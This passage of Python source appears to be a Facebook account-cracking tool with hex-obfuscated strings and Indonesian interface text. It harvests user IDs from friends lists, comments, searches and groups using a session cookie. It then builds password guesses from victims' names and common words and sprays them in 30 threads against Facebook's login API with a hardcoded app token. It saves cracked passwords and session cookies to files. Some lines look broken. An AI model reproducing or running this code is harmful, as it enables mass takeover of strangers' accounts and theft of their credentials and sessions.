					Dump(cookie).Dump_Pencarian(eval(binascii.unhexlify(b'662268747470733a2f2f6d62617369632e66616365626f6f6b2e636f6d2f7075626c69632f7b6761737d22').decode('8ftu'[::+-+-(-(+1))])))
			except:pass
			Crack().atursandi()
		elif menu in['6','06']:
			prints(Panel(eval(binascii.unhexlify(b'662222227b50327d6d6173756b616e20696420677275702c2070617374696b616e2067727570206265727369666174207075626c696b2064616e20746964616b2070726976617465222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			user=console.input(eval(binascii.unhexlify(b'6622207b557d23207b50327d6d6173756b616e2069642067727570203a2022').decode('8ftu'[::+-+-(-(+1))])))
			Dump(cookie).Dump_MemberGrup(eval(binascii.unhexlify(b'662268747470733a2f2f6d62617369632e66616365626f6f6b2e636f6d2f67726f7570732f7b757365727d22').decode('8ftu'[::+-+-(-(+1))])))
			Crack().atursandi()
		elif menu in['7','07']:
			prints(Panel(eval(binascii.unhexlify(b'662222227b50327d6d6173756b616e2074656d7061742066696c652c2070617374696b616e20697a696e206b652070656e79696d70616e616e207375646168206469616b7469666b616e222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			user=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d6d6173756b616e2074656d7061742066696c65203a2022').decode('8ftu'[::+-+-(-(+1))])))
			Dump(cookie).Dump_File(user)
			Crack().atursandi()
		elif menu in['BOT','Bot','bot']:
			exit(prints(Panel(eval(binascii.unhexlify(b'662222227b4d327df09f998f206d6f686f6e206d61616620666974757220696e6920736564616e672064616c616d207461686170207065726261696b616e222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))])))))
		elif menu in['8','08']:
			file_cp()
		elif menu in['LAIN','Lain','lain']:
			Lain(cookie).menu()
		else:
			exit(prints(Panel(eval(binascii.unhexlify(b'662222227b4d327df09f998f206d6f686f6e206d61616620666974757220696e6920736564616e672064616c616d207461686170207065726261696b616e222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))])))))
class Dump:
	def __init__(self,cookie):
		self.cookie=cookie
	def GetUser(self):
		try:
			url=ses.get('https://mbasic.facebook.com/profile.php',cookies=self.cookie).text
			uid=re.findall('name="target" value="(.*?)"',url)[0]
			return uid
		except:
			pass
	def Dump_Publik(self,url):
		try:
			url=parser(ses.get(url,cookies=self.cookie).text,'html.parser')
			for z in url.find_all('a',href=True):
				if 'fref' in z.get('href'):
					if '/profile.php?id=' in z.get('href'):uid=''.join(bs4.re.findall('profile\\.php\\?id=(.*?)&',z.get('href')));nama=z.text
					else:uid=''.join(bs4.re.findall('/(.*?)\\?',z.get('href')));nama=z.text
					if uid+'<=>'+nama in tampung:pass
					else:tampung.append(uid+'<=>'+nama)
					console.print(eval(binascii.unhexlify(b'6622207b55327d23207b50327d736564616e672070726f736573206d656e67756d70756c6b616e207b55327d69647b50327d2c20626572686173696c206d656e64617061746b616e7b42327d207b6c656e2874616d70756e67297d207b50327d69642e2e2e2e22').decode('8ftu'[::+-+-(-(+1))])),end='')
			for x in url.find_all('a',href=True):
				if 'Lihat Teman Lain' in x.text:
					self.Dump_Publik('https://mbasic.facebook.com/'+x.get('href'))
		except:pass
	def Dump_Komentar(self,url):
		try:
			data=parser(ses.get(url).text,'html.parser')
			for isi in data.find_all('h3'):
				for ids in isi.find_all('a',href=True):
					if 'profile.php' in ids.get('href'):uid=ids.get('href').split('=')[1].replace('&refid','')
					else:uid=re.findall('/(.*?)?__',ids['href'])[0]. replace('?refid=52&','')
					nama=ids.text
					if uid+'<=>'+nama in tampung:pass
					else:tampung.append(uid+'<=>'+nama)
					
			for z in data.find_all('a',href=True):
				if 'Lihat komentar sebelumnya…' in z.text:
					self.Dump_Komentar('https://mbasic.facebook.com'+z['href'])
		except:pass
	def Dump_Pencarian(self,url):
		try:
			data=parser(ses.get(str(url)).text,'html.parser')
			for z in data.find_all('td'):
				namp=re.findall('\\<a\\ href\\="\\/(.*?)">\\<div\\ class\\=".*?">\\<div\\ class\\=".*?">(.*?)<\\/div\\>',str(z))
				for uid,nama in namp:
					if 'profile.php?' in uid:uid=re.findall('id=(.*)',str(uid))[0]
					elif '<span' in nama:nama=re.findall('(.*?)\\<',str(nama))[0]
					if uid+'<=>'+nama in tampung:pass
					else:tampung.append(uid+'<=>'+nama)
					console.print(eval(binascii.unhexlify(b'6622207b55327d23207b50327d736564616e672070726f736573206d656e67756d70756c6b616e207b55327d69647b50327d2c20626572686173696c206d656e64617061746b616e7b42327d207b6c656e2874616d70756e67297d207b50327d69642e2e2e2e22').decode('8ftu'[::+-+-(-(+1))])),end=')
			for x in data.find_all('a',href=True):
				if 'Lihat Hasil Selanjutnya' in x.text:
					self.Dump_Pencarian(x.get('href'))
		except:pass
	def Dump_MemberGrup(self,url):
		try:
			data=parser(ses.get(url,cookies=self.cookie,headers={'user-agent':'Mozilla/5.0 (SymbianOS/9.3; Series60/3.2 NokiaE52-1/052.003; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/525 (KHTML, like Gecko) Version/3.0 BrowserNG/7.2.6.2 3gpp-gba'}).text,'html.parser')
			judul=re.findall('<title>(.*?)</title>',str(data))[0]
			for isi in data.find_all('h3'):
				for ids in isi.find_all('a',href=True):
					if 'profile.php' in ids.get('href'):uid=ids.get('href').split('=')[1].replace('&eav','');nama=ids.text
					else:
						if ids.text==judul:pass
						else:uid=ids.get('href').split('/')[1].split('?')[0];nama=ids.text
					if uid+'<=>'+nama in tampung:pass
					else:tampung.append(uid+'<=>'+nama)
					console.print(eval(binascii.unhexlify(b'6622207b55327d23207b50327d736564616e672070726f736573206d656e67756d70756c6b616e207b55327d69647b50327d2c20626572686173696c206d656e64617061746b616e7b42327d207b6c656e2874616d70756e67297d207b50327d69642e2e2e2e22').decode('8ftu'[::+-+-(-(+1))])),end=')
			for x in data.find_all('a',href=True):
				if 'Lihat Postingan Lainnya' in x.text:
					self.Dump_MemberGrup('https://mbasic.facebook.com'+x.get('href'))
		except:pass
	def Dump_File(self,lok):
		try:
			file=open(lok,'r').read().splitlines()
			for z in file:
				tampung.append(z)
		except:pass
	def Dump_Email(self,nama,limit):
		try:
			for z in range(int(limit)):
				email=nama+str(z)+'@gmail.com<=>'+nama
				if email in tampung:pass
				else:tampung.append(email)
		except:pass
class Crack:
	def __init__(self):
		self.loop=0
		self.ok=[]
		self.cp=[]
		self.hari_ini=datetime.now().strftime('%d-%B-%Y')
	def atursandi(self):
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d20202020626572686173696c206d656e67756d70756c6b616e7b42327d207b6c656e2874616d70756e67297d207b50327d6964222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,21),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		set=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d6170616b6168206b616d7520696e67696e206d656e6767756e616b616e2073616e6469206d616e75616c3f28792f6e29203a2022').decode('8ftu'[::+-+-(-(+1))])))
		if set in['Y','y']:
			prints(Panel(eval(binascii.unhexlify(b'662222227b50327d73696c61686b616e2062756174206b61746173616e64692064656e67616e202c20286b6f6d612920736562616761692070656d697361682074696170206b61746173616e6469222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			pwx=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d62756174206b61746173616e6469203a2022').decode('8ftu'[::+-+-(-(+1))]))).split(',')
			if len(pwx)<=5:
				prints(Panel(eval(binascii.unhexlify(b'662222227b4d327d6b61746173616e6469206861727573206d696e696d616c2036206875727566222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
				exit()
			self.manual(pwx)
		else:
			self.otomatis()
	def manual(self,pw):
		global prog,des
		prog=Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}% ]'))
		des=prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30)as fall:
				self.simpan_hasil()
				for data in tampung:
					user=data.split('<=>')[0]
					nama=data.split('<=>')[1]
					pwx=pw
					fall.submit(self.metode_api,user,pwx)
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d202020626572686173696c20637261636b20746f74616c207b6c656e2874616d70756e67297d2069642c2064656e67616e20686173696c204f4b203a207b48327d7b6c656e2873656c662e6f6b297d7b50327d204350203a207b4b327d7b6c656e2873656c662e6370297d7b50327d222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,8),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		sys.exit()
	def otomatis(self):
		global prog,des
		prog=Progress(TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}% ]'))
		des=prog.add_task('',total=len(tampung))
		with prog:
			with ThreadPoolExecutor(max_workers=30)as fall:
				self.simpan_hasil()
				for data in tampung:
					try:
						pwx=[]
						user=data.split('<=>')[0]
						nama=data.split('<=>')[1]
						depan=nama.split(' ')[0]
						if len(nama)<=5:
							if len(depan)<3:
								pass 
							else:
								pwx.append(depan+'123')
								pwx.append(depan+'111')
								pwx.append(depan+'321')
								pwx.append(depan+'1234')
								pwx.append(depan+'12345')
								pwx.append(depan+'123456')
								pwx.append('ganteng')
								pwx.append('moonton')
								pwx.append('ganteng123')
								pwx.append('katasandi')
								pwx.append('freefire')
								pwx.append('freefire123')
						else:
							if len(depan)<3:
								pwx.append(nama)
								pwx.append(nama+'123')
								pwx.append(nama+'321')
							else:
								pwx.append(nama)
								pwx.append(depan+'123')
								pwx.append(depan+'321')
								pwx.append(depan+'1234')
								pwx.append(depan+'12345')
								pwx.append(depan+'123456')
								pwx.append('kata sandi')
								pwx.append('free fire')
								pwx.append('free fire123')
								pwx.append('123456')
							belakang=nama.split(' ')[1]
							if len(belakang)<3:
								pwx.append(depan+belakang)
								pwx.append(depan+belakang+'123')
								pwx.append(depan+belakang+'321')
								pwx.append(depan+belakang+'1234')
								pwx.append(depan+belakang+'12345')
								pwx.append(depan+belakang+'123456')
							else:
								pwx.append(depan+belakang)
								pwx.append(belakang+'123')
								pwx.append(belakang+'321')
								pwx.append(belakang+'1234')
								pwx.append(belakang+'12345')
								pwx.append('kontol')
								pwx.append('bangsat')
								pwx.append('indonesia')
								pwx.append('kontol123')
								pwx.append('bismillah')
								pwx.append('mobile legends')
								pwx.append('domino123')
						fall.submit(self.metode_api,user,pwx)
					except:
						fall.submit(self.metode_api,user,pwx)
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d202020626572686173696c20637261636b20746f74616c207b6c656e2874616d70756e67297d2069642c2064656e67616e20686173696c204f4b203a207b48327d7b6c656e2873656c662e6f6b297d7b50327d204350203a207b4b327d7b6c656e2873656c662e6370297d7b50327d222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,8),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		sys.exit()
	def metode_api(self,email,pwx):
		prog.update(des,description=eval(binascii.unhexlify(b'6622207b55327d23207b50327d5b7b55327d4c756666792d58447b50327d5d207b50327d5b7b50327d7b7374722873656c662e6c6f6f70297d7b50327d2f7b50327d7b6c656e2874616d70756e67297d7b50327d5d7b50327d205b4f4b203a207b55327d7b6c656e2873656c662e6f6b297d7b50327d204350203a207b42327d7b6c656e2873656c662e6370297d7b50327d5d205b22').decode('8ftu'[::+-+-(-(+1))])))
		prog.advance(des)
		try:
			for pw in pwx:
				pw=pw.lower()
				ua=random.choice(ugent)
				params={
				 'access_token':'200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
				 'sdk_version':{random.randint(1,26)},
				 'email':email,
				 'locale':'en_US',
				 'password':pw,
				 'sdk':'android',
				 'generate_session_cookies':'1',
				 'sig':'4f648f21fb58fcd2aa1c65f35f441ef5'
				}
				headers={
				 'Host':'graph.facebook.com',
				 'x-fb-connection-bandwidth':str(random.randint(20000000,30000000)),
				 'x-fb-sim-hni':str(random.randint(20000,40000)),
				 'x-fb-net-hni':str(random.randint(20000,40000)),
				 'x-fb-connection-quality':'EXCELLENT',
				 'user-agent':ua,
				 'content-type':'application/x-www-form-urlencoded',
				 'x-fb-http-engine':'Liger'
				}
				post=ses.post('https://graph.facebook.com/auth/login',params=params,headers=headers,allow_redirects=False)
				if 'session_key' in post.text and 'EAA' in post.text:
					coki=';'.join(i['name']+'='+i['value']for i in post.json()['session_cookies'])
					user=re.findall('c_user=(\\d+)',coki)[0]
					if user in self.ok or user in self.cp:
						break
					else:
						self.ok.append(user)
						tree=Tree(' ',guide_style=eval(binascii.unhexlify(b'66227b636f6c6f725f6f6b7d22').decode('8ftu'[::+-+-(-(+1))])))
						tree.add(Panel(eval(binascii.unhexlify(b'66227b55327d202020202020205375636365732d4c6f67696e7b50327d22').decode('8ftu'[::+-+-(-(+1))])),width=30,padding=(0,2),style=eval(binascii.unhexlify(b'66227b636f6c6f725f6f6b7d22').decode('8ftu'[::+-+-(-(+1))]))))
						tree.add(eval(binascii.unhexlify(b'66225c727b41417d55736572204944207b50327d20203a207b55327d7b757365727d22').decode('8ftu'[::+-+-(-(+1))])))
						tree.add(eval(binascii.unhexlify(b'66227b41417d50617373776f7264207b50327d203a207b55327d7b70777d22').decode('8ftu'[::+-+-(-(+1))])))
						tree.add(Panel(eval(binascii.unhexlify(b'66227b55327d7b636f6b697d7b50327d22').decode('8ftu'[::+-+-(-(+1))])),width=83,padding=(0,2),style=eval(binascii.unhexlify(b'66227b636f6c6f725f6f6b7d22').decode('8ftu'[::+-+-(-(+1))]))))
						tree.add(Panel(eval(binascii.unhexlify(b'66227b55327d7b75617d7b50327d22').decode('8ftu'[::+-+-(-(+1))])),width=83,padding=(0,2),style=eval(binascii.unhexlify(b'66227b636f6c6f725f6f6b7d22').decode('8ftu'[::+-+-(-(+1))]))))
						prints(tree)
						open(eval(binascii.unhexlify(b'66224f4b2f7b73656c662e686172695f696e697d2e74787422').decode('8ftu'[::+-+-(-(+1))])),'a').write(eval(binascii.unhexlify(b'66227b757365727d7c7b70777d7c7b636f6b697d5c6e22').decode('8ftu'[::+-+-(-(+1))])))
						break
				elif 'User must verify their account' in post.text:
					user=post.json()['error']['error_data']['uid']
					if user in self.ok or user in self.cp:
						break
					else:
						self.cp.append(user)
						tree=Tree(' ',guide_style=eval(binascii.unhexlify(b'66227b636f6c6f725f63707d22').decode('8ftu'[::+-+-(-(+1))])))
						tree.add(Panel(eval(binascii.unhexlify(b'66227b42327d202020436865636b706f696e742d4c6f67696e7b50327d22').decode('8ftu'[::+-+-(-(+1))])),width=30,padding=(0,2),style=eval(binascii.unhexlify(b'66227b636f6c6f725f63707d22').decode('8ftu'[::+-+-(-(+1))]))))
						tree.add(eval(binascii.unhexlify(b'66225c727b41417d55736572204944207b50327d20202020203a207b42327d7b757365727d22').decode('8ftu'[::+-+-(-(+1))])))
						tree.add(eval(binascii.unhexlify(b'66227b41417d50617373776f7264207b50327d202020203a207b42327d7b70777d22').decode('8ftu'[::+-+-(-(+1))])))
						tree.add(Panel(eval(binascii.unhexlify(b'66227b42327d7b75617d7b50327d22').decode('8ftu'[::+-+-(-(+1))])),width=83,padding=(0,2),style=eval(binascii.unhexlify(b'66227b636f6c6f725f63707d22').decode('8ftu'[::+-+-(-(+1))]))))
						prints(tree)
						open(eval(binascii.unhexlify(b'662243502f7b73656c662e686172695f696e697d2e74787422').decode('8ftu'[::+-+-(-(+1))])),'a').write(eval(binascii.unhexlify(b'66227b757365727d7c7b70777d5c6e22').decode('8ftu'[::+-+-(-(+1))])))
						break
				elif 'Calls to this api have exceeded the rate limit. (613)' in post.text:
					prog.update(des,description=eval(binascii.unhexlify(b'6622207b48327de280a27b50327d20637261636b207b4d327d7370616d7b50327d207b7374722873656c662e6c6f6f70297d2f7b6c656e2874616d70756e67297d204f4b203a207b48327d7b6c656e2873656c662e6f6b297d7b50327d204350203a207b4b327d7b6c656e2873656c662e6370297d7b50327d22').decode('8ftu'[::+-+-(-(+1))])))
					prog.advance(des)
					time.sleep(30)
				else:continue
		except ConnectionError:
			time.sleep(30)
			self.metode_api(user,pwx)
		self.loop+=1
	def simpan_hasil(self):
		prints(Panel(eval(binascii.unhexlify(b'662222225c7220202020207b50327d686173696c20637261636b207b55327d6f6b7b50327d2074657273696d70616e206b65203a207b55327d4f4b2f7b73656c662e686172695f696e697d2e7478747b50327d0d0a7b50327d2020202020686173696c20637261636b207b42327d6370207b50327d74657273696d70616e206b65203a207b42327d43502f7b73656c662e686172695f696e697d2e7478747b50327d222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,10),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		prints(Panel(eval(binascii.unhexlify(b'662222225c7220202020207b50327d4a696b6120546964616b2041646120486173696c2048696475706b616e204d6f64652050657361776174203520446574696b207b55327d212121222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,10),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
class Lain:
	def __init__(self,cookie):
		self.cookie=cookie
		self.file=[]
		self.listfile=[]
	def menu(self):
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d5b7b55327d30317b50327d5d2e207b42327d6c69686174207b41417d616b756e207b55327d686173696c20637261636b20207b50327d5b7b55327d30347b50327d5d2e207b42327d67616e7469207b41417d7761726e61207b55327d74656d6120746f6f6c730d0a7b50327d5b7b55327d30327b50327d5d2e207b42327d67657420696e666f207b41417d616b756e207b55327d746172676574202020207b50327d5b7b55327d30357b50327d5d2e207b42327d74616d70696c6b616e207b41417d696e666f207b55327d636f6f6b6965730d0a7b50327d5b7b55327d30337b50327d5d2e207b42327d73657474696e67207b41417d75736572207b55327d6167656e742020202020207b50327d5b7b55327d30367b50327d5d2e7b42327d204b656d62616c69207b50327d29222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,7),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		menu=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d70696c6968206d656e75203a2022').decode('8ftu'[::+-+-(-(+1))])))
		if menu in['01','1']:
			self.cek_hasil()
		elif menu in['04','4']:
			exit(prints(Panel(eval(binascii.unhexlify(b'662222227b4d327df09f998f206d6f686f6e206d61616620666974757220696e6920736564616e672064616c616d207461686170207065726261696b616e222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))])))))
		elif menu in['05','5']:
			self.tampil_cookie()
		elif menu in['06','6']:
			Menu().menu()
			exit(prints(Panel(eval(binascii.unhexlify(b'662222227b48327d626572686173696c206d656e67686170757320636f6f6b69652c2073696c61686b616e206b6574696b20756c616e6720707974686f6e2068616b692d66622e7079222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))])))))
		else:
			exit(prints(Panel(eval(binascii.unhexlify(b'662222227b4d327df09f998f206d6f686f6e206d61616620666974757220696e6920736564616e672064616c616d207461686170207065726261696b616e222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))])))))
	def cek_hasil(self):
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d5b7b55327d30317b50327d5d2e207b42327d6c6968617420616b756e207b41417d686173696c207b55327d637261636b206f6b0d0a5b7b55327d30327b50327d5d2e207b42327d6c6968617420616b756e207b41417d686173696c207b55327d637261636b206370222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,20),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		ask=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d6d6173756b616e2070696c6968616e203a2022').decode('8ftu'[::+-+-(-(+1))])))
		if ask in['1','01']:folder='OK'
		else:folder='CP'
		dirs=os.listdir(folder)
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d20626572686173696c206d656e656d756b616e207b6c656e2864697273297d2066696c6520686173696c20637261636b206f6b222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,15),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		num=0
		for fil in dirs:
			num+=1
			self.file.append(fil)
			totalakun=open(eval(binascii.unhexlify(b'66227b666f6c6465727d2f7b66696c7d22').decode('8ftu'[::+-+-(-(+1))])),'r').read().splitlines()
			self.listfile.append(Panel(eval(binascii.unhexlify(b'66227b50327d5b7b636f6c6f725f746578747d307b6e756d7d7b50327d5d22').decode('8ftu'[::+-+-(-(+1))])),width=10,title=eval(binascii.unhexlify(b'66227b50327d6e6f6d657222').decode('8ftu'[::+-+-(-(+1))])),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			self.listfile.append(Panel(eval(binascii.unhexlify(b'66227b50327d7b66696c7d22').decode('8ftu'[::+-+-(-(+1))])),width=35,title=eval(binascii.unhexlify(b'66227b50327d74616e6767616c22').decode('8ftu'[::+-+-(-(+1))])),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			self.listfile.append(Panel(eval(binascii.unhexlify(b'66227b50327d7b6c656e28746f74616c616b756e297d20616b756e22').decode('8ftu'[::+-+-(-(+1))])),width=28,title=eval(binascii.unhexlify(b'66227b50327d746f74616c20616b756e22').decode('8ftu'[::+-+-(-(+1))])),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		console.print(Columns(self.listfile))
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d6b616d752068616e7961207065726c75206d656d696c69682064616e206d656d6173756b616e206e6f6d657220646172692066696c6520637261636b2064692061746173222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		result=console.input(eval(binascii.unhexlify(b'6622207b55327d23207b50327d6d6173756b616e20616e676b61203a2022').decode('8ftu'[::+-+-(-(+1))])))
		try:
			files=self.file[int(result)-1]
			totalhasil=open(eval(binascii.unhexlify(b'66227b666f6c6465727d2f7b66696c65737d22').decode('8ftu'[::+-+-(-(+1))])),'r').read().splitlines()
		except:
			prints(Panel(eval(binascii.unhexlify(b'662222227b4d327d66696c652079616e6720616e6461206d6173756b616e20746964616b207465727365646961206174617520696e707574206b616d7520746964616b2062656e6172222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
			exit()
		nama_file=(eval(binascii.unhexlify(b'66227b66696c65737d22').decode('8ftu'[::+-+-(-(+1))]))).replace('-',' ').replace('.txt','')
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d6e616d612066696c6520686173696c20637261636b203a207b6e616d615f66696c657d2064616e20746572646170617420746f74616c20616b756e203a207b6c656e28746f74616c686173696c297d222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		for akun in totalhasil:
			user=akun.split('|')[0]
			pw=akun.split('|')[1]
			tree=Tree(' ')
			if folder=='OK':
				cookie=akun.split('|')[2]
				tree.add(eval(binascii.unhexlify(b'66225c727b55327d7b757365727d7c7b70777d7b50327d2022').decode('8ftu'[::+-+-(-(+1))])))
				tree.add(eval(binascii.unhexlify(b'66227b48327d7b636f6f6b69657d7b50327d22').decode('8ftu'[::+-+-(-(+1))])))
			else:
				tree.add(eval(binascii.unhexlify(b'66225c727b42327d7b757365727d7c7b70777d7b50327d2022').decode('8ftu'[::+-+-(-(+1))])))
			prints(tree)
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d20626572686173696c206d656e676563656b2064616e206d656e64617061746b616e20746f74616c207b6c656e28746f74616c686173696c297d20616b756e20646172692066696c65222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,7),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		exit()
	def ganti_tema(self):
		prints(Panel(eval(binascii.unhexlify(b'662222227b50327d5b7b636f6c6f725f746578747d30317b50327d5d2e2067616e7469207761726e612074656d61206d6572616820205b7b636f6c6f725f746578747d30367b50327d5d2e2067616e7469207761726e612074656d612070696e6b0d0a5b7b636f6c6f725f746578747d30327b50327d5d2e2067616e7469207761726e612074656d612068696a617520205b7b636f6c6f725f746578747d30377b50327d5d2e2067616e7469207761726e612074656d61206379616e0d0a5b7b636f6c6f725f746578747d30337b50327d5d2e2067616e7469207761726e612074656d61206b756e696e67205b7b636f6c6f725f746578747d30387b50327d5d2e2067616e7469207761726e612074656d612070757469680d0a5b7b636f6c6f725f746578747d30347b50327d5d2e2067616e7469207761726e612074656d6120626972752020205b7b636f6c6f725f746578747d30397b50327d5d2e2067616e7469207761726e612074656d61206f72616e67650d0a5b7b636f6c6f725f746578747d30357b50327d5d2e2067616e7469207761726e612074656d6120756e67752020205b7b636f6c6f725f746578747d31307b50327d5d2e2067616e7469207761726e612074656d612061627532222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,7),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		ask=console.input(eval(binascii.unhexlify(b'6622207b48327de280a2207b50327d70696c69682074656d61203a2022').decode('8ftu'[::+-+-(-(+1))])))
		if ask in['01','1']:warna='[#FF0000]';teks='merah'
		elif ask in['02','2']:warna='[#00FF00]';teks='hijau'
		elif ask in['03','3']:warna='[#FFFF00]';teks='kuning'
		elif ask in['04','4']:warna='[#00C8FF]';teks='biru'
		elif ask in['05','5']:warna='[#AF00FF]';teks='ungu'
		elif ask in['06','6']:warna='[#FF00FF]';teks='pink'
		elif ask in['07','7']:warna='[#00FFFF]';teks='cyan'
		elif ask in['08','8']:warna='[#FFFFFF]';teks='putih'
		elif ask in['09','9']:warna='[#FF8F00]';teks='orange'
		elif ask in['10']:warna='[#AAAAAA]';teks='abu-abu'
		open('data/theme_color','w').write(warna+'|'+warna.replace('[','').replace(']',''))
		prints(Panel(eval(binascii.unhexlify(b'662222227b48327d626572686173696c206d656e6767616e74692074656d61206b65207b74656b737d2c2073696c61686b616e206d756c616920756c616e6720746f6f6c73222222').decode('8ftu'[::+-+-(-(+1))])),width=87,padding=(0,6),style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		sys.exit()
	def tampil_cookie(self):
		now=datetime.now()
		hari=now.day+int(30)
		if hari>30:hari=hari-30
		bulan=now.month+1
		if bulan>12:bulan=bulan-12
		if now.month+1>12:tahun=now.year+1
		data=date(year=tahun,month=bulan,day=hari)
		aktif=data.strftime('%d %B %Y')
		console.print(eval(binascii.unhexlify(b'6622207b48327de280a2207b50327d616b7469662073616d706169203a207b616b7469667d22').decode('8ftu'[::+-+-(-(+1))])))
		prints(Panel(eval(binascii.unhexlify(b'662222227b48327d7b73656c662e636f6f6b69652e6765742827636f6f6b696527297d222222').decode('8ftu'[::+-+-(-(+1))])),width=87,style=eval(binascii.unhexlify(b'66227b636f6c6f725f70616e656c7d22').decode('8ftu'[::+-+-(-(+1))]))))
		sys.exit()
import requests,shutil,os,re,bs4,sys,json,time,platform,random,datetime,subprocess,logging,base64
import hmac,hashlib,urllib,stdiomask,urllib.request,uuid
from concurrent.futures import ThreadPoolExecutor
from bs4 import BeautifulSoup as parser
from threading import(Thread,Event)
from time import sleep as jeda
from datetime import datetime
ct=datetime.now()
n=ct.month
bulan_=['January','Februari','Maret','April','Mei','Juni','Juli','Agustus','September','Oktober','November','Desember']
try:
	if n<0 or n>12:
		exit()
	nTemp=n-1
except ValueError:
	exit()
current=datetime.now()
hari=current.day
bulan=bulan_[nTemp]
tahun=current.year
bullan=current.month
waktu=('%s-%s-%s'%(hari,bulan,tahun))
bulan12={'01':'January','02':'Februari','03':'Maret','04':'April','05':'Mei','06':'Juni','07':'Juli','08':'Agustus','09':'September','10':'Oktober','11':'November','12':'Desember'}
M='[1;91m' # MERAH
H='[1;92m' # HIJAU
K='[1;93m' # KUNING
B='[1;94m' # BIRU
U='[1;95m' # UNGU
O='[1;96m' # BIRU MUDA
P='[1;97m' # PUTIH
J='[38;2;255;127;0;1m' # ORANGE
N='[0m' # WARNA MATI
acak=[M,H,K,B,U,O,P,J]
warna=random.choice(acak)
til='[0m '
